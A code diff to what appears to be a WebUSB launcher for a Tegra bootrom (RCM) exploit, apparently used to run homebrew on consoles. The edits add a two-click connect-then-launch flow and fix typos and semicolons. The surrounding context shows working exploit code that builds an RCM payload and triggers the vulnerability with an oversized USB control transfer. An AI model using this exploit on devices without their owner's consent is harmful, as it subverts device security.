@@ -11,6 +11,9 @@ const RCM_PAYLOAD_ADDRESS = 0x40010000;
 const INTERMEZZO_LOCATION = 0x4001F000;
 const PAYLOAD_LOAD_BLOCK = 0x40020000;
 
+let device;
+let isDeviceConnected = false;
+
 function createRCMPayload(intermezzo, payload) {
   const rcmLength = 0x30298;
 
@@ -18,7 +21,7 @@ function createRCMPayload(intermezzo, payload) {
 
   const rcmPayloadSize = Math.ceil((0x2A8 + (0x4 * intermezzoAddressRepeatCount) + 0x1000 + payload.byteLength) / 0x1000) * 0x1000;
 
-  const rcmPayload = new Uint8Array(new ArrayBuffer(rcmPayloadSize))
+  const rcmPayload = new Uint8Array(new ArrayBuffer(rcmPayloadSize));
   const rcmPayloadView = new DataView(rcmPayload.buffer);
 
   rcmPayloadView.setUint32(0x0, rcmLength, true);
@@ -72,8 +75,6 @@ function logOutput(...message) {
   document.getElementById("output").value += message.join(" ") + "\n";
 }
 
-let device;
-
 async function launchPayload(payload) {
   await device.open();
   logOutput(`Connected to ${device.manufacturerName} ${device.productName}`);
@@ -82,7 +83,6 @@ async function launchPayload(payload) {
 
   const deviceID = await device.transferIn(1, 16);
   logOutput(`Device ID: ${bufferToHex(deviceID.data)}`);
-
 
   const rcmPayload = createRCMPayload(intermezzo, payload);
   logOutput("Sending payload...");
@@ -94,7 +94,7 @@ async function launchPayload(payload) {
     await device.transferOut(1, new ArrayBuffer(0x1000));
   }
 
-  logOutput("Trigging vulnerability...");
+  logOutput("Triggering vulnerability...");
   const vulnerabilityLength = 0x7000;
   const smash = await device.controlTransferIn({
     requestType: 'standard',
@@ -110,12 +110,18 @@ document.getElementById("goButton").addEventListener("click", async () => {
     logOutput("Browser does not support WebUSB! See the instructions below.");
     return;
   }
-  logOutput("Requesting access to USB device...");
-  try {
-    device = await navigator.usb.requestDevice({ filters: [{ vendorId: 0x0955 }] });
-  } catch (e) {
-    logOutput(e);
-    return;
+
+  if (!isDeviceConnected) {
+    logOutput("Requesting access to USB device...");
+    try {
+      device = await navigator.usb.requestDevice({ filters: [{ vendorId: 0x0955 }] });
+      isDeviceConnected = true;  // Device is connected
+      logOutput("Device connected! Press the button again to launch the payload.");
+      return; // Wait for the second click
+    } catch (e) {
+      logOutput(e);
+      return;
+    }
   }
 
   const payloadType = document.forms.mainForm.payload.value;
@@ -133,15 +139,14 @@ document.getElementById("goButton").addEventListener("click", async () => {
     // TODO: these stopped working at some point, the auto-fetching of payloads
     let payloadURL = 'payloads/' + payloadType;
 
-    // fetch the payload file as a UInt8Array
     var xhr = new XMLHttpRequest();
     xhr.open('GET', payloadURL, true);
     xhr.responseType = 'arraybuffer';
     xhr.onload = function(e) {
       var uInt8Array = new Uint8Array(this.response);
-      launchPayload(uInt8Array); // launch payload when that's done
+      launchPayload(uInt8Array); // launch payload when the response is loaded
     };
-    xhr.send()
+    xhr.send();
     return;
   }
 
